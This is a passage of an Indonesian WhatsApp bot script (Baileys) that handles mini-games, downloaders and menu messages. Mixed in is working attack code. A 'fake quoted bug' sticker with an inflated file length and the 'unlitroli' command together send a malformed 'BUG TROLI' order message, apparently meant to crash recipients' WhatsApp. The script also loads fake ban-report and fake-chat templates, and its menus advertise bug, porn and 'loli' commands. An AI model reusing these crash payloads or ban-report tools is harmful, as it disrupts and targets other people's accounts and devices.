 Biiofc.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Tebakan 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Tebakan`}, {quoted:m}) 
 delete tebaktebakan[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

}
//TicTacToe
this.game = this.game ? this.game : {}
let room = Object.values(this.game).find(room => room.id && room.game && room.state && room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == 'PLAYING')
if (room) {
let ok
let isWin = !1
let isTie = !1
let isSurrender = !1
// m.reply(`[DEBUG]\n${parseInt(m.text)}`)
if (!/^([1-9]|(me)?nyerah|surr?ender|off|skip)$/i.test(m.text)) return
isSurrender = !/^[1-9]$/.test(m.text)
if (m.sender !== room.game.currentTurn) { // nek wayahku
if (!isSurrender) return !0
}
if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
m.reply({
'-3': 'Game telah berakhir',
'-2': 'Invalid',
'-1': 'Posisi Invalid',
0: 'Posisi Invalid',
}[ok])
return !0
}
if (m.sender === room.game.winner) isWin = true
else if (room.game.board === 511) isTie = true
let arr = room.game.render().map(v => {
return {
X: '❌',
O: '⭕',
1: '1️⃣',
2: '2️⃣',
3: '3️⃣',
4: '4️⃣',
5: '5️⃣',
6: '6️⃣',
7: '7️⃣',
8: '8️⃣',
9: '9️⃣',
}[v]
})
if (isSurrender) {
room.game._currentTurn = m.sender === room.game.playerX
isWin = true
}
let winner = isSurrender ? room.game.currentTurn : room.game.winner
let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

${isWin ? `@${winner.split('@')[0]} Menang!` : isTie ? `Game berakhir` : `Giliran ${['❌', '⭕'][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`}
❌: @${room.game.playerX.split('@')[0]}
⭕: @${room.game.playerO.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== from)
room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = from
if (room.x !== room.o) await Biiofc.sendText(room.x, str, m, { mentions: parseMention(str) } )
await Biiofc.sendText(room.o, str, m, { mentions: parseMention(str) } )
if (isTie || isWin) {
delete this.game[room.id]
}

}
//Suit PvP
this.suit = this.suit ? this.suit : {}
let roof = Object.values(this.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
if (roof) {
let win = ''
let tie = false
if (m.sender == roof.p2 && /^(acc(ept)?|terima|gas|oke?|tolak|gamau|nanti|ga(k.)?bisa|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
if (/^(tolak|gamau|nanti|n|ga(k.)?bisa)/i.test(m.text)) {
Biiofc.sendTextWithMentions(from, `@${roof.p2.split`@`[0]} menolak suit, suit dibatalkan`, m)
delete this.suit[roof.id]
return !0
}
roof.status = 'play'
roof.asal = from
clearTimeout(roof.waktu)
//delete roof[roof.id].waktu
Biiofc.sendText(from, `Suit telah dikirimkan ke chat

@${roof.p.split`@`[0]} dan 
@${roof.p2.split`@`[0]}

Silahkan pilih suit di chat masing"
klik https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
if (!roof.pilih) Biiofc.sendText(roof.p, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
if (!roof.pilih2) Biiofc.sendText(roof.p2, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
roof.waktu_milih = setTimeout(() => {
if (!roof.pilih && !roof.pilih2) Biiofc.sendText(from, `Kedua pemain tidak niat main,\nSuit dibatalkan`)
else if (!roof.pilih || !roof.pilih2) {
win = !roof.pilih ? roof.p2 : roof.p
Biiofc.sendTextWithMentions(from, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} tidak memilih suit, game berakhir`, m)
}
delete this.suit[roof.id]
return !0
}, roof.timeout)
}
let jwb = m.sender == roof.p
let jwb2 = m.sender == roof.p2
let g = /gunting/i
let b = /batu/i
let k = /kertas/i
let reg = /^(gunting|batu|kertas)/i
if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
roof.pilih = reg.exec(m.text.toLowerCase())[0]
roof.text = m.text
m.reply(`Kamu telah memilih ${m.text} ${!roof.pilih2 ? `\n\nMenunggu lawan memilih` : ''}`)
if (!roof.pilih2) Biiofc.sendText(roof.p2, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
}
if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
roof.text2 = m.text
m.reply(`Kamu telah memilih ${m.text} ${!roof.pilih ? `\n\nMenunggu lawan memilih` : ''}`)
if (!roof.pilih) Biiofc.sendText(roof.p, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
}
let stage = roof.pilih
let stage2 = roof.pilih2
if (roof.pilih && roof.pilih2) {
clearTimeout(roof.waktu_milih)
if (b.test(stage) && g.test(stage2)) win = roof.p
else if (b.test(stage) && k.test(stage2)) win = roof.p2
else if (g.test(stage) && k.test(stage2)) win = roof.p
else if (g.test(stage) && b.test(stage2)) win = roof.p2
else if (k.test(stage) && b.test(stage2)) win = roof.p
else if (k.test(stage) && g.test(stage2)) win = roof.p2
else if (stage == stage2) tie = true
Biiofc.sendText(roof.asal, `_*Hasil Suit*_${tie ? '\nSERI' : ''}

@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Menang \n` : ` Kalah \n`}
@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Menang \n` : ` Kalah \n`}
`.trim(), m, { mentions: [roof.p, roof.p2] })
delete this.suit[roof.id]
}

}
//ssweb
const XeonStickWait = () => {
        let XeonStikRep = fs.readFileSync('./XeonMedia/theme/sticker_reply/wait.webp')
        Biiofc.sendMessage(from, { sticker: XeonStikRep }, { quoted: fkontak })
        }
        const XeonStickAdmin = () => {
        let XeonStikRep = fs.readFileSync('./XeonMedia/theme/sticker_reply/admin.webp')
        Biiofc.sendMessage(from, { sticker: XeonStikRep }, { quoted: fkontak })
        }
        const XeonStickBotAdmin = () => {
        let XeonStikRep = fs.readFileSync('./XeonMedia/theme/sticker_reply/botadmin.webp')
        Biiofc.sendMessage(from, { sticker: XeonStikRep }, { quoted: fkontak })
        }
        const XeonStickOwner = () => {
        let XeonStikRep = fs.readFileSync('./XeonMedia/theme/sticker_reply/owner.webp')
        Biiofc.sendMessage(from, { sticker: XeonStikRep }, { quoted: fkontak })
        }
        const XeonStickGroup = () => {
        let XeonStikRep = fs.readFileSync('./XeonMedia/theme/sticker_reply/group.webp')
        Biiofc.sendMessage(from, { sticker: XeonStikRep }, { quoted: fkontak })
        }
        const XeonStickPrivate = () => {
        let XeonStikRep = fs.readFileSync('./XeonMedia/theme/sticker_reply/private.webp')
        Biiofc.sendMessage(from, { sticker: XeonStikRep }, { quoted: fkontak })
        }
// TEXT BANNED
const { textbanv1, textbanv2, textbanv3, textbanv4, textbanv5, textbanv6, textbanv7, textbanv8, textbanv9, textbanv10, textbanv11, textbanv12, textbanv13, textbanv14, textbanv15, textbanv16, textbanv17, textbanv18, textbanv19, textbanv20, textbanv21, textbanv22, textbanv23, textbanv24, textbanv25, textbanv26, textbanv27, textbanv28, textbanv29, textbanv30, textbanv31, textbanv32, textbanv33, textbanv34, textbanv35, textbanv36, textbanv37, textbanv38 } = require('./wangsap/textban.js')

// TEXT UNBANNED
const { textunbanv1, textunbanv2, textunbanv3, textunbanv4, textunbanv5, textunbanv6, textunbanv7, textunbanv8, textunbanv9, textunbanv10, textunbanv11, textunbanv12, textunbanv13, textunbanv14, textunbanv15, textunbanv16, textunbanv17, textunbanv18, textunbanv19, textunbanv20, textunbanv21 } = require('./wangsap/textunban.js')

// TEXT FAKE CHAT 
const { fakec1, fakec2, fakec3, fakec4, fakec5, fakec6, fakec7, fakec8, fakec9, fakec10, fakec11 } = require('./wangsap/fakechat.js')

// TOTAL FITUR
const { totalfakechat, totalunban, totalban } = require('./wangsap/total.js')

// TEXT TOOLS
const { tools1, tools2 } = require('./wangsap/tools.js')

// SALDO BRIMO
const { saldoo } = require('./wangsap/saldoo.js')

//pickRandom
const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}
// fake quoted bug
const lep = { 
key: {
fromMe: [], 
participant: "0@s.whatsapp.net", ...(from ? { remoteJid: "" } : {}) 
},
'message': {
"stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc",
"fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=",
"fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=",
"mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=",
"mimetype": "image/webp",
"height": 40,
"width": 40,
"directPath": "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781",
"fileLength": "99999999",
"mediaKeyTimestamp": "16572901099967",
'isAnimated': []
}}}

const hw = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) 
},
"message": {
"audioMessage": {
"url": "https://mmg.whatsapp.net/v/t62.7114-24/56189035_1525713724502608_8940049807532382549_n.enc?ccb=11-4&oh=01_AdR7-4b88Hf2fQrEhEBY89KZL17TYONZdz95n87cdnDuPQ&oe=6489D172&mms3=true",
"mimetype": "audio/mp4",
"fileSha256": "oZeGy+La3ZfKAnQ1epm3rbm1IXH8UQy7NrKUK3aQfyo=",
"fileLength": "1067401",
"seconds": 60,
"ptt": true,
"mediaKey": "PeyVe3/+2nyDoHIsAfeWPGJlgRt34z1uLcV3Mh7Bmfg=",
"fileEncSha256": "TLOKOAvB22qIfTNXnTdcmZppZiNY9pcw+BZtExSBkIE=",
"directPath": "/v/t62.7114-24/56189035_1525713724502608_8940049807532382549_n.enc?ccb=11-4&oh=01_AdR7-4b88Hf2fQrEhEBY89KZL17TYONZdz95n87cdnDuPQ&oe=6489D172",
"mediaKeyTimestamp": "1684161893"
}}}

const fkontak = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { 'contactMessage': { 'displayName': `᭖͜͡RafatharOfficial`, 'vcard': `BEGIN:VCARD\nVERSION:9.0\nN:XL;BiiofcBot,;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': { url: 'https://telegra.ph/file/0fc4f6dbbc5d5f95ede6f.jpg' }}}}
function parseMention(text = '') {
return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
}
  async function obfus(query) {
return new Promise((resolve, reject) => {
try {
const obfuscationResult = jsobfus.obfuscate(query,
{
compact: false,
controlFlowFlattening: true,
controlFlowFlatteningThreshold: 1,
numbersToExpressions: true,
simplify: true, 
stringArrayShuffle: true,
splitStrings: true,
stringArrayThreshold: 1
}
);
const result = {
status: 200,
author: `𝗖𝗲𝗸𝗶𝗹-𝗠𝗱`,
result: obfuscationResult.getObfuscatedCode()
}
resolve(result)
} catch (e) {
reject(e)
}
})
}

global.db = JSON.parse(fs.readFileSync('./database/database.json'))
if (global.db) global.db = {
sticker: {},
database: {}, 
game: {},
others: {},
users: {},
chats: {},
...(global.db || {})
}


  //buttons Tambahan
const ntiktok = ('© alfiboysss')
const ini_mark = `0@s.whatsapp.net`
const ownernya = ownernomer + '@s.whatsapp.net'

const downloadMp4 = async (Link) => {
let gHz = require("./scrape/savefrom")
let Lehd = await gHz.savefrom(Link)
let ghd = await reSize(Lehd.thumb, 300, 300)
let ghed = await ytdl.getInfo(Link)
let gdyr = await Biiofc.sendMessage(from, {image: { url: Lehd.thumb } , caption: `Channel Name : ${ghed.player_response.videoDetails.author}
Channel Link : https://youtube.com/channel/${ghed.player_response.videoDetails.channelId}
Title : ${Lehd.meta.title}
Duration : ${Lehd.meta.duration}
Desc : ${ghed.player_response.videoDetails.shortDescription}`}, { quoted : m })
try {
await ytdl.getInfo(Link)
let mp4File = getRandom('.mp4')
console.log(color('Download Video With ytdl-core'))
let nana = ytdl(Link)
.pipe(fs.createWriteStream(mp4File))
.on('finish', async () => {
await Biiofc.sendMessage(from, { video: fs.readFileSync(mp4File), caption: mess.succes, gifPlayback: false }, { quoted: gdyr })
fs.unlinkSync(`./${mp4File}`)
})
} catch (err) {
reply(`${err}`)
}
}

const downloadMp3 = async (Link) => {
let pNx = require("./scrape/savefrom")
let Puxa = await pNx.savefrom(Link)
let MlP = await reSize(Puxa.thumb, 300, 300)
let PlXz = await ytdl.getInfo(Link)
let gedeyeer = await Biiofc.sendMessage(from, { image: { url: Puxa.thumb } , caption: `Channel Name : ${PlXz.player_response.videoDetails.author}
Channel Link : https://youtube.com/channel/${PlXz.player_response.videoDetails.channelId}
Title : ${Puxa.meta.title}
Duration : ${Puxa.meta.duration}
Desc : ${PlXz.player_response.videoDetails.shortDescription}`}, { quoted : m })
try {
await ytdl.getInfo(Link)
let mp3File = getRandom('.mp3')
console.log(color('Download Audio With ytdl-core'))
ytdl(Link, { filter: 'audioonly' })
.pipe(fs.createWriteStream(mp3File))
.on('finish', async () => {
await Biiofc.sendMessage(from, { audio: fs.readFileSync(mp3File), mimetype: 'audio/mp4' }, { quoted: gedeyeer })
fs.unlinkSync(mp3File)
})
} catch (err) {
reply(`${err}`)
}
}

let vote = db.others.vote = []

let teks_format =`*Berikut ini cara order kode otp*

_Example_
.order id

_Contoh_
.order 14

untuk melihat id layanan
silahkan ketik .layanan`

let teks_format2 = `Format Salah !!

_Example_
.getorder <order_id>

_Contoh_
.getorder 55778888
`
switch (command) {
case "menu": {

if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*
_I Am *Botzz* Made By Reyz
_If There Is An Error!!_
_Please Report To Developer_
*_Berikut Saldo anda_ Rp:* *${toRupiah(cekSaldo(sender, db_saldo))}_*
▬▭▬▭▬▭▬▭▬▭▬▭▬
乂 *I N F O-U S E R*

   ☍ *Name* : ${pushname}
   ☍ *Number* : ${m.sender.split('@')[0]}
   ☍ *Status* : ${isOwner ? "Owner":"Free"}
   ☍ *User* : ${isPremium ? 'Premium' : 'Gratisan'}
   
乂 *I N F O-B O T*

  ☍ Name : ${global.namabot}
  ☍ Creator : ${global.namaCreator}
  ☍ Prefix : ( ${prefix} )
  ☍ Nama Script : ${global.namasc}
  ☍ Versi Script : ${global.versisc}
  ☍ Mode : ${Biiofc.public ? 'Public-Mode 👥' : 'Self-Mode 👤'}
  ☍ Platform : ${os.platform()}
  ☍ Runtime : ${runtime(process.uptime())}
  ☍ Language : Javascript
  ☍ Version Baileys : *^${version}*
  ☍ Total Fitur : ${totalFitur()}
  
▭▬▭( *乂 𝗦 𝗨 𝗕 - 𝗠 𝗘 𝗡 𝗨 - 𝗨 𝗧 𝗔 𝗠 𝗔 )▭▬▭

╭  ◦ ᴄʀᴇᴀᴛᴏʀ: Reyz Hayanasi
│  ◦ ᴛɪᴋᴛᴏᴋ: @kuah_bakso_enak
╰  ◦ ᴘʀᴇғɪx: .

ᴊɪᴋᴀ ᴀᴅᴀ ᴍᴀsᴀʟᴀʜ ᴅᴀʟᴀᴍ ᴘᴇɴɢɢᴜɴᴀᴀɴ sɪʟᴀʜᴋᴀɴ ʜᴜʙᴜɴɢɪ ᴄʀᴇᴀᴛᴏʀ ᴜɴᴛᴜᴋ ᴍᴇɴᴀɴʏᴀᴋᴀɴ *.ᴏᴡɴᴇʀ*

╭  ◦ ғᴏʀᴍᴀᴛ ᴅᴀғᴛᴀʀ: *.ᴅᴀғᴛᴀʀ*
│  ◦ ᴍᴇɴᴜ ᴜᴛᴀᴍᴀ *.ᴍᴇɴᴜ*
│  ◦ ʟɪʜᴀᴛ ғɪᴛᴜʀ ᴠ2 *.ᴍᴇɴᴜᴠ2*
│  ◦ sᴇᴍᴜᴀ ғɪᴛᴜʀ: *.ᴀʟʟᴍᴇɴᴜ*
│  ◦ ᴋᴀʟᴏ ᴍᴀᴜ ᴅᴏɴᴀᴛᴇ ᴋᴇᴛɪᴋ *.ᴅᴏɴᴀᴛᴇ*
│  ◦ sᴄʀɪᴘᴛ *.sᴄ*
╰  ◦ ᴀʟʟ ʀᴇᴄᴏᴅᴇ *.ᴄʀᴇᴅɪᴛs*

Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`

Biiofc.sendMessage(m.chat, {
text: text12,
contextInfo: { mentionedJid: [sender, owned],
externalAdReply: {
showAdAttribution: true,
title: namaCreator,
body: 'bodynya',
thumbnailUrl: 'https://telegra.ph/file/19ce69fff25171bed39a4.jpg',
sourceUrl: "https://chat.whatsapp.com/ERJYROUy4roJXCxZ6zJrHB",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted:m})
await Biiofc.sendMessage(m.chat, {audio: fs.readFileSync('./freya/audio.mp3'),mimetype: 'audio/mpeg',ptt: true}, {quoted:m})}
break
case "menuv2": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*
_I Am *Botzz* Made By Reyz Hayanasi_
_If There Is An Error!!_
_Please Report To Developer_
*_Berikut Saldo anda_ Rp:* *${toRupiah(cekSaldo(sender, db_saldo))}_*
▬▭▬▭▬▭▬▭▬▭▬▭▬
乂 *I N F O-U S E R*

   ☍ *Name* : ${pushname}
   ☍ *Number* : ${m.sender.split('@')[0]}
   ☍ *Status* : ${isOwner ? "Owner 👑️":"User"}
   ☍ *User* : ${isPremium ? 'Premium 👑' : 'Gratisan'}

乂 *I N F O-B O T*

  ☍ Name : ${global.namabot}
  ☍ Creator : ${global.namaCreator}
  ☍ Prefix : ( ${prefix} )
  ☍ Nama Script : ${global.namasc}
  ☍ Versi Script : ${global.versisc}
  ☍ Mode : ${Biiofc.public ? 'Public-Mode 👥' : 'Self-Mode 👤'}
  ☍ Platform : ${os.platform()}
  ☍ Runtime : ${runtime(process.uptime())}
  ☍ Language : Javascript
  ☍ Version Baileys : *^${version}*
  ☍ Total Fitur : ${totalFitur()}

▭▬▭( *乂  𝗦 𝗨 𝗕 - 𝗠 𝗘 𝗡 𝗨 - 𝗞 𝗘 𝗗 𝗨 𝗔 )▭▬▭

╭ ◦ ${prefix}groupmenu
│ ◦ ${prefix}ownermenu
│ ◦ ${prefix}pushkontakmenu
│ ◦ ${prefix}bugmenu
│ ◦ ${prefix}pm2menu
│ ◦ ${prefix}jebehmenu
│ ◦ ${prefix}bokepmenu
│ ◦ ${prefix}animemenu
│ ◦ ${prefix}stalkmenu
│ ◦ ${prefix}paymentmenu
│ ◦ ${prefix}anonymousmenu
│ ◦ ${prefix}saldomenu
│ ◦ ${prefix}suntikmenu
│ ◦ ${prefix}cmdmenu
│ ◦ ${prefix}randommenu
│ ◦ ${prefix}tiktokrandomenu
│ ◦ ${prefix}fiturnewmenu
│ ◦ ${prefix}domainmenu
│ ◦ ${prefix}webpmenu
│ ◦ ${prefix}vpsmenu
│ ◦ ${prefix}topupmenu
│ ◦ ${prefix}textwamenu
│ ◦ ${prefix}panelmenu
│ ◦ ${prefix}otomatismenu
│ ◦ ${prefix}storemenu
│ ◦ ${prefix}nsfwmenu
│ ◦ ${prefix}animev2menu
│ ◦ ${prefix}openaimenu
│ ◦ ${prefix}bugnewmenu
│ ◦ ${prefix}primbonmenu 
│ ◦ ${prefix}textmakermenu
│ ◦ ${prefix}convertmenu
│ ◦ ${prefix}qoutesmenu
│ ◦ ${prefix}funmenu
│ ◦ ${prefix}islammenu
│ ◦ ${prefix}gamemenu
│ ◦ ${prefix}mathmenu
│ ◦ ${prefix}downloadmenu
╰ ◦ ${prefix}othermenu

ᴊɪᴋᴀ ᴀᴅᴀ ᴍᴀsᴀʟᴀʜ ᴅᴀʟᴀᴍ ᴘᴇɴɢɢᴜɴᴀᴀɴ sɪʟᴀʜᴋᴀɴ ʜᴜʙᴜɴɢɪ ᴄʀᴇᴀᴛᴏʀ ᴜɴᴛᴜᴋ ᴍᴇɴᴀɴʏᴀᴋᴀɴ *.ᴏᴡɴᴇʀ*

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(m.chat, {
text: text12,
contextInfo: { mentionedJid: [sender, owned],
externalAdReply: {
showAdAttribution: true,
title: namaCreator,
body: 'bodynya',
thumbnailUrl: 'https://telegra.ph/file/19ce69fff25171bed39a4.jpg',
sourceUrl: "https://chat.whatsapp.com/ERJYROUy4roJXCxZ6zJrHB",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted:m})
await Biiofc.sendMessage(m.chat, {audio: fs.readFileSync('./freya/audio.mp3'),mimetype: 'audio/mpeg',ptt: true}, {quoted:m})}
break
case "fiturnewmenu":{
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
    const cvps = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *FITUR NEW MENU* )▭▬▭

⭔${prefix}puh1
⭔${prefix}puh2
⭔${prefix}puh3
⭔${prefix}puh4
⭔${prefix}capi
⭔${prefix}capilip
⭔${prefix}subfinder ( domain )

Powered By *@${owned.split("@")[0]}*

`
Biiofc.sendMessage(m.chat, {
text: cvps,
contextInfo: { mentionedJid: [sender, owned],
externalAdReply: {
showAdAttribution: true,
title: namaCreator,
body: 'bodynya',
thumbnailUrl: 'https://telegra.ph/file/19ce69fff25171bed39a4.jpg',
sourceUrl: "https://chat.whatsapp.com/ERJYROUy4roJXCxZ6zJrHB",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: fkontak})
}
break
        case 'unlitroli': {
if (!isPremium) return m.reply(`*khusus rakyat rafathar*`)
jumlah = "1"
for (let i = 0; i < jumlah; i++) {
let dok = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `${namabot}` ,jpegThumbnail: thumb}}}
var order = generateWAMessageFromContent(from, proto.Message.fromObject({
"orderMessage": {
"orderId": "599519108102353",
"thumbnail": thumb,
"itemCount": 1999,
"status": "INQUIRY",
"surface": "CATALOG",
"message": 'HW MODS WA',
"orderTitle": " BUG TROLI ", // 
"sellerJid": "6283183432282@s.whatsapp.net",
"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
}
}), { userJid: from, quoted : lep})
Biiofc.relayMessage(from, order.message, { messageId: order.key.id })
}
await sleep(2000)
}
break
  case "jebehmenu": case "jb": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const textbi = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *JEBEH MENU* )▭▬▭

⭔${prefix}formatpost
⭔${prefix}formatneed
⭔${prefix}feerekber
⭔${prefix}formatpencairan
⭔${prefix}mc *_nama gc_*
⭔${prefix}allrec
⭔${prefix}danamasuk
⭔${prefix}donerekber
⭔${prefix}donemc *_isi manual_*

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(m.chat, {
text: textbi,
contextInfo: { mentionedJid: [sender, owned],
externalAdReply: {
showAdAttribution: true,
title: namaCreator,
body: 'bodynya',
thumbnailUrl: 'https://telegra.ph/file/34363c995351e9ac46715.jpg',
sourceUrl: "https://chat.whatsapp.com/ERJYROUy4roJXCxZ6zJrHB",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: fkontak})
}
break
case "stalkmenu": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *STALK MENU* )▭▬▭

⊙ ${prefix}githubstalk 
⊙ ${prefix}gitclone
⊙ ${prefix}stalkig
⊙ ${prefix}npmstalk
⊙ ${prefix}stalktiktok

Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(m.chat, {
text: text12,
contextInfo: { mentionedJid: [sender, owned],
externalAdReply: {
showAdAttribution: true,
title: namaCreator,
body: 'bodynya',
thumbnailUrl: 'https://telegra.ph/file/34363c995351e9ac46715.jpg',
sourceUrl: "https://chat.whatsapp.com/ERJYROUy4roJXCxZ6zJrHB",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: fkontak})
}
break
case "bokepmenu": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *BOKEP MENU* )▭▬▭

⭔ ${prefix}xnxxsearch
⭔ ${prefix}xnxxdl
⭔ ${prefix}pptt 

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(m.chat, {
text: text12,
contextInfo: { mentionedJid: [sender, owned],
externalAdReply: {
showAdAttribution: true,
title: namaCreator,
body: 'bodynya',
thumbnailUrl: 'https://telegra.ph/file/34363c995351e9ac46715.jpg',
sourceUrl: "https://chat.whatsapp.com/ERJYROUy4roJXCxZ6zJrHB",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: fkontak})
}
break
case "animemenu": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *ANIME MENU* )▭▬▭

⭔ ${prefix}animespank
⭔ ${prefix}walpaperanime
⭔ ${prefix}thailand
⭔ ${prefix}loli
⭔ ${prefix}cosplay
⭔ ${prefix}cecan
⭔ ${prefix}cogan
⭔ ${prefix}china
⭔ ${prefix}indonesia
⭔ ${prefix}korea
⭔ ${prefix}malaysia
⭔ ${prefix}vietnam

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(m.chat, {
text: text12,
contextInfo: { mentionedJid: [sender, owned],
externalAdReply: {
showAdAttribution: true,
title: namaCreator,
body: 'bodynya',
thumbnailUrl: 'https://telegra.ph/file/34363c995351e9ac46715.jpg',
sourceUrl: "https://chat.whatsapp.com/ERJYROUy4roJXCxZ6zJrHB",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: fkontak})
}
break       
case "panelmenu": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const textbi = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *PANEL MENU* )▭▬▭

⭔${prefix}serverpanel1

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(m.chat, {
text: textbi,
contextInfo: { mentionedJid: [sender, owned],
externalAdReply: {
showAdAttribution: true,
title: namaCreator,
body: 'bodynya',
thumbnailUrl: 'https://telegra.ph/file/34363c995351e9ac46715.jpg',
sourceUrl: "https://chat.whatsapp.com/ERJYROUy4roJXCxZ6zJrHB",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: fkontak})
}
break
